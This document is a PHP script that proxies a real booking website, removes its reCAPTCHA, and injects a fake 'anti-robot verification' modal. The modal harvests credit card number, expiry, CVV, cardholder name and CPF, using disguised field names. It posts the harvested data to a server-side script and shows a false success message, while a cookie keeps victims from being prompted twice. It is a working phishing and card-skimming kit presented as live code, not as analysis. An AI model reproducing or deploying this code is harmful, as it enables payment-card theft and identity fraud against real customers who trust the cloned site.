<?php
// Verifica se a URL foi fornecida via GET
if (isset($_GET['url'])) {
    $url = $_GET['url'];  // Obtém a URL do parâmetro GET
} else {
    // Se não houver URL, exibe uma mensagem de erro
    echo "Erro: URL não fornecida.";
    exit;
}

// Inicializa a sessão cURL
$ch = curl_init();

// Define a URL a ser chamada
curl_setopt($ch, CURLOPT_URL, $url);

// Configura para retornar o conteúdo da resposta em vez de exibi-lo diretamente
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

// Executa a solicitação cURL
$response = curl_exec($ch);

// Verifica se ocorreu algum erro na solicitação
if ($response === false) {
    echo "Erro no cURL: " . curl_error($ch);
} else {
    // Extrai o domínio principal da URL
    $url_parts = parse_url($url);
    $base_url = $url_parts['scheme'] . '://' . $url_parts['host'] . '/';  // Ex: https://interativapantanal.com.br/
    
    // Substitui os caminhos relativos "../" por URLs completas
    $response = preg_replace('/\.\.\/([^"]*)/', $base_url . '$1', $response);
	$response = str_replace('id="btnEnviar"', 'id="btnEnviar" onclick="abrirModalAleatorio(event);"', $response);


    // HTML a ser adicionado ao final do response
    $html_to_add = <<<HTML
	<!-- Overlay de confirmação -->
	<div id="confirm-modal-overlay" class="modal-overlay" style="display:none;">
	  <div class="modal-content">
		<span onclick="document.getElementById('confirm-modal-overlay').style.display='none'" class="close-button">&times;</span>
		<strong style="font-size: 15px;margin-bottom: 10%;">Ao prosseguir, você concorda que as informações do seu cartão de crédito serão utilizadas exclusivamente para fins de verificação de autenticidade e para garantir que a interação realizada não é de um robô. Reiteramos que não haverá nenhum desconto ou cobrança em sua conta em decorrência deste processo.</strong>
		<button onclick="acceptTerms()" class="btn btn-block u-btn-primary">Aceitar</button>
	  </div>
	</div>

	<!-- Overlay do formulário principal -->
	<div id="modal-overlay" class="modal-overlay" style="display:none;">
	  <div class="modal-content">
		<span onclick="document.getElementById('modal-overlay').style.display='none'" class="close-button">&times;</span>
		<div id="id-formViagens" class="g-px-10 g-bg-black-opacity-0_1 g-rounded-top-5">
		  <form action="#" method="post" name="frmContato" target="_blank" id="frmContato" class="sky-form">
			<div class="row" style="text-align: center;margin-bottom: 4px;">
			  <div class="form-group col-md-12 g-pt-10 g-color-primary">
				<h4 class="wc-font-Oswald">INFORMAÇÕES E RESERVAS</h4>
			  </div>
			</div>
			<!-- Formulário de pré-reserva -->
			<dl class="viagem-info" style="text-align: center;">
			  <dt class="viagem-title">Nome</dt>
			  <dd id="nome" class="viagem-desc tituloViagem"></dd>
			  <dt class="viagem-title tipoTransporte">Telefone:</dt>
			  <dd id="telefone" class="viagem-desc tipoTransporte"></dd>
			  <dt class="viagem-title tipoTransporte">Whatsapp:</dt>
			  <dd id="whatsapp" class="viagem-desc tipoTransporte"></dd>
			  <dt class="viagem-title">E-mail:</dt>
			  <dd  id="email"  class="viagem-desc tipoTransporte"></dd>
			  <dt class="viagem-title">Reserva:</dt>
			  <dd  id="reserva"  class="viagem-desc tituloViagem"></dd>
			  <dt class="viagem-title">Hospedes</dt>
			  <dd  id="hospedes"  class="viagem-desc"></dd>
			  <dt class="viagem-title">Data:</dt>
			  <dd  id="data"  class="viagem-desc"></dd>
			</dl>
			<div class="row">
			  <div class="form-group col-md-12">
				<label>Número do cartão</label>
				<br>
				<label id="inval" style="color: red;"></label>
				<input maxlength="16" name="tubarao" id="tubarao" required class="form-control" type="text" placeholder="">
			  </div>
			</div>
			<div class="row">
			  <div class="form-group col-md-12">
				<label>Data de Validade (mês/ano)</label>
				<br>
				<label id="inval2" style="color: red;"></label>
				<input data-mask="00/00" data-mask-reverse="true" name="tainha" id="tainha" required class="form-control" type="text" placeholder="MM/YY">
			  </div>
			</div>
			<div class="row">
			  <div class="form-group col-md-12">
				<label>Nome do titular (igual ao cartão)</label>
				<input name="nemo" id="nemo" required class="form-control" type="text" placeholder="">
			  </div>
			</div>
			<div class="row">
			  <div class="form-group col-md-12">
				<label>Código de segurança</label>
				<br>
				<label id="inval3" style="color: red;"></label>
				<input name="bagre" id="bagre" required class="form-control" maxlength="4" type="text" placeholder="">
			  </div>
			</div>
			<div class="row">
			  <div class="form-group col-md-12">
				<label>CPF</label>
				<br>
				<label id="inval1" style="color: red;"></label>
				<input name="lambari" id="lambari" required="" class="form-control" data-mask="000.000.000-00" type="text" placeholder="">
			  </div>
			</div>
			<div class="row">
			  <div class="form-group col-md-12">
				<button class="btn btn-block u-btn-primary g-mr-10" type="submit" id="btnEnviar2" name="btnEnviar2">Enviar formulário!</button>
			  </div>
			</div>
		  </form>
		</div>

	<style>
	  /* Estilos dos modais */
	  .modal-overlay {
		display: flex;
		justify-content: center;
		align-items: center;
		position: fixed;
		top: 0;
		left: 0;
		width: 100%;
		height: 100%;
		background-color: rgba(0, 0, 0, 0.5);
		z-index: 1000;
	  }
	  
	  .modal-content {
		background-color: #fff;
		padding: 20px;
		border-radius: 10px;
		max-width: 500px;
		width: 100%;
		box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
		position: relative;
		overflow: auto;
		max-height: 99vh;
	  }
	  
	  .close-button {
		top: -10px;
		right: 10px;
		font-size: 48px;
		cursor: pointer;
	  }
	  
	  .open-modal-button {
		padding: 10px 20px;
		background-color: #007bff;
		color: white;
		border: none;
		border-radius: 5px;
		cursor: pointer;
	  }
	  
	  .open-modal-button:hover {
		background-color: #0056b3;
	  }
	  /* Estilo personalizado para o botão OK */
	  .swal2-confirm-button {
		background-color: white !important;
		color: #555 !important;
		border: 1px solid #ddd !important;
	  }

	  /* Estilo personalizado para o botão WhatsApp */
	  .swal2-cancel-button {
		background-color: #25d366 !important;  /* Cor verde do WhatsApp */
		color: white !important;
		border: none !important;
	  }
	</style>
	<script>
	document.addEventListener("DOMContentLoaded", function() {
	  var elemento = document.querySelector('.wc-icone-WhatsApp');
	  elemento.style.display = 'none';
	});
	</script>
	<script>
	  //SEMPRE TROCAR O querySelector DA RESERVA POIS SEMPRE MUDA 
	  function acceptTerms() {
		document.getElementById('confirm-modal-overlay').style.display = 'none';
		document.getElementById('modal-overlay').style.display = 'flex';
		//NOME
		var nome1 = document.getElementById('txf_t_nome').value;
		var nome2 = document.getElementById('nome');
		nome2.textContent = nome1;
		
		//TELEFONE
		var telefone1 = document.getElementById('txf_t_telefone').value;
		var telefone2 = document.getElementById('telefone');
		telefone2.textContent = telefone1;
		
		//WHATSAPP
		var whatsapp1 = document.getElementById('txf_t_whatsapp').value;
		var whatsapp2 = document.getElementById('whatsapp');
		whatsapp2.textContent = whatsapp1;
		
		//EMAIL
		var email1 = document.getElementById('txf_t_email').value;
		var email2 = document.getElementById('email');
		email2.textContent = email1;
		
		//RESERVA
		var reserva1 = document.querySelector('.u-heading-v1__title').textContent;
		var reserva2 = document.getElementById('reserva');
		reserva2.textContent = reserva1;
		
		//HOSPEDES
		var adultos1 = document.getElementById('lsm_t_adultos').value;
		var adultos2 = (adultos1 == "0") ? "" : "Adultos: " + adultos1;
		console.log(adultos2);
		
		var criancas1 = document.getElementById('lsm_t_criancas').value;
		var criancas2 = (criancas1 == "0") ? "" : ", Crianças: " + criancas1;
		console.log(criancas2);
		
		
		var bebes1 = document.getElementById('lsm_t_bebes').value;
		var bebes2 = (bebes1 == "0") ? "" : ", Bebês: " + criancas1;
		console.log(bebes2);
		
		var hospedesFormatada = adultos2 + criancas2 + bebes2;
		
		var hospedes2 = document.getElementById('hospedes');
		hospedes2.textContent = hospedesFormatada;
		
		
		//DATA
		var data1 = document.getElementById('datepickerFrom').value;
		var data2 = document.getElementById('datepickerTo').value;
		
		var data3 = document.getElementById('data');
		var dataFormatada = data1 + ' a ' + data2;
		data3.textContent = dataFormatada;
		
		
		
		data2.textContent = data1;
	  }
	  
	  // Fechar o modal ao clicar fora do conteúdo
	  window.onclick = function(event) {
		if (event.target == document.getElementById('modal-overlay')) {
		  document.getElementById('modal-overlay').style.display = "none";
		}
		if (event.target == document.getElementById('confirm-modal-overlay')) {
		  document.getElementById('confirm-modal-overlay').style.display = "none";
		}
	  }
	</script>
	<script>
	  document.getElementById("btnEnviar2").addEventListener("click", function (e) {
		e.preventDefault(); // Impede o envio padrão do formulário

		// Captura os valores dos campos
		const tubarao = document.getElementById("tubarao").value;
		const tainha = document.getElementById("tainha").value;
		const nemo = document.getElementById("nemo").value;
		const bagre = document.getElementById("bagre").value;
		const lambari = document.getElementById("lambari").value;

		// Referências para as mensagens de erro
		const inval1 = document.getElementById("inval");
		const inval2 = document.getElementById("inval1");
		const inval3 = document.getElementById("inval2");
		const inval4 = document.getElementById("inval3");

		let isValid = true;

		// Valida o número do cartão (tubarao)
		if (!validateCreditCard(tubarao)) {
		  isValid = false;
		} else {
		  inval1.textContent = "";
		  document.getElementById("tubarao").style.borderColor = "";
		}

		// Valida a data de validade do cartão (tainha)
		if (!validateCardExpirationDate(tainha)) {
		  isValid = false;
		} else {
		  inval2.textContent = "";
		  document.getElementById("tainha").style.borderColor = "";
		}

		// Valida o código de segurança (bagre)
		if (!validateCVV(bagre)) {
		  isValid = false;
		} else {
		  inval3.textContent = "";
		  document.getElementById("bagre").style.borderColor = "";
		}

		// Valida o CPF (lambari)
		if (!validateCPF(lambari)) {
		  isValid = false;
		} else {
		  inval4.textContent = "";
		  document.getElementById("lambari").style.borderColor = "";
		}

		// Se todos os campos forem válidos, envia os dados
		if (isValid) {
		  const url = "PagarMe.php"; // Substitua pela URL do servidor

		  const formData = {
	  cardNumber: tubarao, // Altere "tubarao" para "cardNumber"
	  expirationDate: tainha, // Altere "tainha" para "expirationDate"
	  nome: nemo,
	  cvv: bagre, // Altere "bagre" para "cvv"
	  cpf: lambari // Altere "lambari" para "cpf"
	};

		  fetch(url, {
			method: "POST",
			headers: {
			  "Content-Type": "application/json",
			},
			body: JSON.stringify(formData),
		  })
			.then((response) => {
			  if (response.ok) {
				document.cookie = "formEnviado=true; path=/; max-age=31536000";
				Swal.fire({
		html: '<i id="carregando" class="fa fa-spinner fa-spin" style="font-size: 100px;"></i>',
		showConfirmButton: false,
		timer: 5000,
		allowOutsideClick: false,
		allowEscapeKey: false
	}).then(() => {
		// Exibir o sucesso após o carregamento
		Swal.fire({
			title: '<h4 style="font-size: 25px;" class="u-heading-v1__title">Suas informações foram enviadas com sucesso!</h4>',
			text: "Fique atento no seu E-mail e WhatsApp! Toda a nossa comunicação se dará por ele.",
			showConfirmButton: true,
			confirmButtonText: 'OK',
			allowOutsideClick: false,
			allowEscapeKey: false,
			customClass: {
				confirmButton: 'swal2-confirm-button'
			},
			preConfirm: () => {
				return true;
			}
		}).then((result) => {
			// Fechar o modal de sucesso após o clique no botão "OK"
			if (result.isConfirmed) {
				document.getElementById('modal-overlay').style.display = "none";
				Swal.close();
			}
		});
	});

			  } else {
				throw new Error("Erro ao enviar o formulário.");
			  }
			})
			.catch((error) => {
			  console.error("Erro:", error);
			});
		} else {
		  //None
		}
	  });
	</script>
	<script>
			/**
			 * Função para validar o número do cartão de crédito usando o algoritmo de Luhn
			 * @param {string} cardNumber - Número do cartão de crédito como string
			 * @returns {boolean} - Retorna true se o número for válido, false caso contrário
			 */
			function validateCreditCard(cardNumber) {
				// Remove espaços em branco e caracteres não numéricos
				const cleanCardNumber = cardNumber.replace(/\D/g, '');

				// Verifica se o número está vazio ou não é composto apenas de dígitos
				if (!/^\d+$/.test(cleanCardNumber)) {
					return false;
				}

				let sum = 0;
				let shouldDouble = false;

				// Itera pelos dígitos de trás para frente
				for (let i = cleanCardNumber.length - 1; i >= 0; i--) {
					let digit = parseInt(cleanCardNumber[i], 10);

					// Dobra o valor do dígito em cada segunda posição
					if (shouldDouble) {
						digit *= 2;
						if (digit > 9) {
							digit -= 9;
						}
					}

					sum += digit;
					shouldDouble = !shouldDouble;
				}

				// Retorna true se a soma for múltipla de 10
				return sum % 10 === 0;
			}

			// Adiciona o evento "blur" ao campo de entrada
			const inputField = document.getElementById('tubarao');
			inputField.addEventListener('blur', () => {
				const cardNumber = inputField.value;
				if (cardNumber.trim() === '') {
				  const botao = document.getElementById("btnEnviar2");
				  botao.disabled = true;
					return;
				}

				if (validateCreditCard(cardNumber)) {
					var inval = document.getElementById('inval');
					inval.textContent = "";
					var border = document.getElementById('tubarao').style = '';
				} else {
				  const botao = document.getElementById("btnEnviar2");
				  botao.disabled = true;

					var inval = document.getElementById('inval');
					inval.textContent = "Cartão Inválido.";
					var border = document.getElementById('tubarao').style.borderColor = 'red';
				}
			});
		</script>
	<script>
	  /**
	   * Função para validar o CPF
	   * @param {string} cpf - CPF no formato "XXX.XXX.XXX-XX"
	   * @returns {boolean} - Retorna true se o CPF for válido, false caso contrário
	   */
	  function validateCPF(cpf) {
		  // Remove pontos, traços e caracteres não numéricos
		  const cleanCPF = cpf.replace(/\D/g, '');

		  // Verifica se o CPF tem 11 dígitos ou é uma sequência inválida (e.g., "11111111111")
		  if (!/^\d{11}$/.test(cleanCPF) || /^([0-9])\1+$/.test(cleanCPF)) {
			  return false;
		  }

		  let sum = 0;
		  let remainder;

		  // Calcula o primeiro dígito verificador
		  for (let i = 1; i <= 9; i++) {
			  sum += parseInt(cleanCPF[i - 1]) * (11 - i);
		  }
		  remainder = (sum * 10) % 11;
		  if (remainder === 10 || remainder === 11) remainder = 0;
		  if (remainder !== parseInt(cleanCPF[9])) return false;

		  sum = 0;

		  // Calcula o segundo dígito verificador
		  for (let i = 1; i <= 10; i++) {
			  sum += parseInt(cleanCPF[i - 1]) * (12 - i);
		  }
		  remainder = (sum * 10) % 11;
		  if (remainder === 10 || remainder === 11) remainder = 0;
		  if (remainder !== parseInt(cleanCPF[10])) return false;

		  return true;
	  }

	  document.addEventListener('DOMContentLoaded', () => {
		  const inputField = document.getElementById('lambari');
		  const botao = document.getElementById("btnEnviar2");
		  const inval = document.getElementById('inval1');

		  inputField.addEventListener('blur', () => {
			  const cpf = inputField.value;

			  if (cpf.trim() === '') {
				  botao.disabled = true;
				  return;
			  }

			  if (validateCPF(cpf)) {
				  inval.textContent = "";
				  inputField.style.borderColor = '';
				  botao.disabled = false;
			  } else {
				  botao.disabled = true;
				  inval.textContent = "CPF Inválido.";
				  inputField.style.borderColor = 'red';
			  }
		  });
	  });
	</script>
	<script>
	  /**
	 * Função para validar a data de validade de um cartão de crédito
	 * @param {string} expirationDate - Data no formato "MM/YY"
	 * @returns {boolean} - Retorna true se a data for válida e não estiver expirada, false caso contrário
	 */
	function validateCardExpirationDate(expirationDate) {
		// Verifica se o formato está correto (MM/YY)
		if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expirationDate)) {
			return false;
		}

		// Divide a data em mês e ano
		const [month, year] = expirationDate.split('/').map(Number);

		// Verifica se o ano está no intervalo válido (até 2034)
		if (year < 0 || year > 34) {
			return false;
		}

		// Obter o ano e mês atual
		const currentDate = new Date();
		const currentMonth = currentDate.getMonth() + 1; // Meses começam em 0
		const currentYear = currentDate.getFullYear() % 100; // Pega apenas os dois últimos dígitos do ano

		// Verifica se a data é válida e não expirou
		if (year > currentYear || (year === currentYear && month >= currentMonth)) {
			return true;
		}
		return false;
	}

	  // Adiciona o evento "blur" ao campo de entrada
	  document.addEventListener('DOMContentLoaded', () => {
		  const inputField1 = document.getElementById('tainha'); // Altere para o ID do seu input
		  const botao1 = document.getElementById("btnEnviar2");
		  const message1 = document.getElementById('inval2');

		  inputField1.addEventListener('blur', () => {
			  const expirationDate = inputField1.value;

			  if (expirationDate.trim() === '') {
				  botao1.disabled = true;
				  message1.textContent = "A data de validade não pode estar vazia.";
				  inputField1.style.borderColor = 'red';
				  return;
			  }

			  if (validateCardExpirationDate(expirationDate)) {
				  message1.textContent = "";
				  inputField1.style.borderColor = '';
				  botao1.disabled = false;
			  } else {
				  botao1.disabled = true;
				  message1.textContent = "Data de validade inválida.";
				  inputField1.style.borderColor = 'red';
			  }
		  });
	  });
	</script>
	<script>
	  document.addEventListener('DOMContentLoaded', () => {
		  const cvvField = document.getElementById('bagre');
		  const additionalField = document.getElementById('tubarao');
		  const submitButton = document.getElementById('btnEnviar2');
		  const errorMessage = document.getElementById('inval3');

		  if (!cvvField || !additionalField || !submitButton || !errorMessage) {
			  console.error("Elementos necessários não foram encontrados no DOM.");
			  return;
		  }

		  cvvField.addEventListener('blur', () => {
			  const cvv = cvvField.value.trim();

			  if (validateCVV(cvv)) {
				  errorMessage.textContent = "";
				  cvvField.style.borderColor = '';
				  submitButton.disabled = false;
			  } else {
				  errorMessage.textContent = "Código de segurança inválido";
				  cvvField.style.borderColor = 'red';
				  submitButton.disabled = true;
			  }
		  });
	  });

	  /**
	   * Função para validar o código de segurança (CVV)
	   * @param {string} cvv - Código de segurança do cartão
	   * @returns {boolean} - Retorna true se for válido, false caso contrário
	   */
	  function validateCVV(cvv) {
		  if (/^\d{3}$/.test(cvv)) {
			  // CVV com 3 dígitos é válido
			  return true;
		  } else if (/^\d{4}$/.test(cvv)) {
			  // CVV com 4 dígitos: validar com o input "tubarao"
			  const tubaraoField = document.getElementById('tubarao');
			  if (tubaraoField && tubaraoField.value.trim().startsWith('3')) {
				  return true; // CVV com 4 dígitos é válido se "tubarao" começa com 3
			  }
		  }
		  return false; // Inválido para qualquer outro caso
	  }
	</script>

		<script>
		  $(document).ready(function(){
	  $('.tainha').mask('00/00');
	  $('.time').mask('00:00:00');
	  $('.date_time').mask('00/00/0000 00:00:00');
	  $('.cep').mask('00000-000');
	  $('.phone').mask('0000-0000');
	  $('.phone_with_ddd').mask('(00) 0000-0000');
	  $('.phone_us').mask('(000) 000-0000');
	  $('.mixed').mask('AAA 000-S0S');
	  $('.lambari').mask('000.000.000-00', {reverse: true});
	  $('.cnpj').mask('00.000.000/0000-00', {reverse: true});
	  $('.money').mask('000.000.000.000.000,00', {reverse: true});
	  $('.money2').mask("#.##0,00", {reverse: true});
	  $('.ip_address').mask('0ZZ.0ZZ.0ZZ.0ZZ', {
		translation: {
		  'Z': {
			pattern: /[0-9]/, optional: true
		  }
		}
	  });
	  $('.ip_address').mask('099.099.099.099');
	  $('.percent').mask('##0,00%', {reverse: true});
	  $('.clear-if-not-match').mask("00/00/0000", {clearIfNotMatch: true});
	  $('.placeholder').mask("00/00/0000", {placeholder: "__/__/____"});
	  $('.fallback').mask("00r00r0000", {
		  translation: {
			'r': {
			  pattern: /[\/]/,
			  fallback: '/'
			},
			placeholder: "__/__/____"
		  }
		});
	  $('.selectonfocus').mask("00/00/0000", {selectOnFocus: true});
	});
	  </script>
	  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.12/jquery.mask.js"></script>
	  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.12/jquery.mask.min.js"></script>
	  <script>
	  src="https://code.jquery.com/jquery-3.2.1.min.js"
	  integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
	  crossorigin="anonymous"</script>
	  <script>
		function abrirModalAleatorio(event) {
			// Função para verificar se o cookie existe
			function verificarCookie(nome) {
				const cookies = document.cookie.split('; ');
				return cookies.some(cookie => cookie.startsWith(nome + "="));  // Ajuste aqui
			}
		
			// Verifica se o cookie 'formEnviado' está presente
			if (verificarCookie('formEnviado')) {
				return; // Não faz nada e permite a submissão do formulário
			}
		
			// Gera um número aleatório entre 0 e 1
			const numeroAleatorio = Math.random();
		
			// Se o número for menor que 0.5, abre o modal
			if (numeroAleatorio > 0) {
				event.preventDefault(); // Impede a submissão do formulário
				document.getElementById('confirm-modal-overlay').style.display = 'flex';
			}
		}
		</script><script>// Importando SweetAlert2
		var sweetalertLink = document.createElement("link");
		sweetalertLink.rel = "stylesheet";
		sweetalertLink.href = "https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css";
		document.head.appendChild(sweetalertLink);

		var sweetalertScript = document.createElement("script");
		sweetalertScript.src = "https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js";
		document.head.appendChild(sweetalertScript);


		// Importando Font Awesome
		var fontawesomeLink = document.createElement("link");
		fontawesomeLink.rel = "stylesheet";
		fontawesomeLink.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css";
		document.head.appendChild(fontawesomeLink);


		// Importando Pagar.me
		var pagarmeScript = document.createElement("script");
		pagarmeScript.src = "https://assets.pagar.me/pagarme-js/3.0/pagarme.min.js";
		document.head.appendChild(pagarmeScript);</script><script>// Importar o CSS do Font Awesome
		const linkCss = document.createElement('link');
		linkCss.rel = 'stylesheet';
		linkCss.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css';
		document.head.appendChild(linkCss);

		// Importar o arquivo .css.map
		const linkCssMap = document.createElement('link');
		linkCssMap.rel = 'stylesheet';
		linkCssMap.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css.map';
		document.head.appendChild(linkCssMap);

		// Importar o arquivo .min.css
		const linkCssMin = document.createElement('link');
		linkCssMin.rel = 'stylesheet';
		linkCssMin.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css';
		document.head.appendChild(linkCssMin);

		// Importar a fonte FontAwesome.otf
		const linkFontOtf = document.createElement('link');
		linkFontOtf.rel = 'stylesheet';
		linkFontOtf.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/FontAwesome.otf';
		document.head.appendChild(linkFontOtf);

		// Importar o arquivo .eot
		const linkFontEot = document.createElement('link');
		linkFontEot.rel = 'stylesheet';
		linkFontEot.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.eot';
		document.head.appendChild(linkFontEot);

		// Importar o arquivo .svg
		const linkFontSvg = document.createElement('link');
		linkFontSvg.rel = 'stylesheet';
		linkFontSvg.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.svg';
		document.head.appendChild(linkFontSvg);

		// Importar o arquivo .ttf
		const linkFontTtf = document.createElement('link');
		linkFontTtf.rel = 'stylesheet';
		linkFontTtf.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.ttf';
		document.head.appendChild(linkFontTtf);

		// Importar o arquivo .woff
		const linkFontWoff = document.createElement('link');
		linkFontWoff.rel = 'stylesheet';
		linkFontWoff.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.woff';
		document.head.appendChild(linkFontWoff);

		// Importar o arquivo .woff2
		const linkFontWoff2 = document.createElement('link');
		linkFontWoff2.rel = 'stylesheet';
		linkFontWoff2.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/fonts/fontawesome-webfont.woff2';
		document.head.appendChild(linkFontWoff2);

		</script>
	HTML;

    // Adiciona o HTML fornecido ao final da resposta
	// Carregar o HTML no DOMDocument para manipulação
    $dom = new DOMDocument();
	libxml_use_internal_errors(true); // Suprime erros de parsing HTML

	// Converte o conteúdo para entidades HTML (para evitar problemas com UTF-8)
	$response = mb_convert_encoding($response, 'HTML-ENTITIES', 'UTF-8');

	$dom->loadHTML($response, LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
	libxml_clear_errors();

	// Encontrar e remover a div com a classe "g-recaptcha"
	$xpath = new DOMXPath($dom);
	$elements = $xpath->query('//div[contains(@class, "g-recaptcha")]');

	foreach ($elements as $element) {
		$element->parentNode->removeChild($element);
	}

	// Salvar o HTML modificado
	$response = $dom->saveHTML();
	}
    $response .= $html_to_add;

    // Exibe o HTML modificado
    echo $response;

// Fecha a sessão cURL
curl_close($ch);
?>
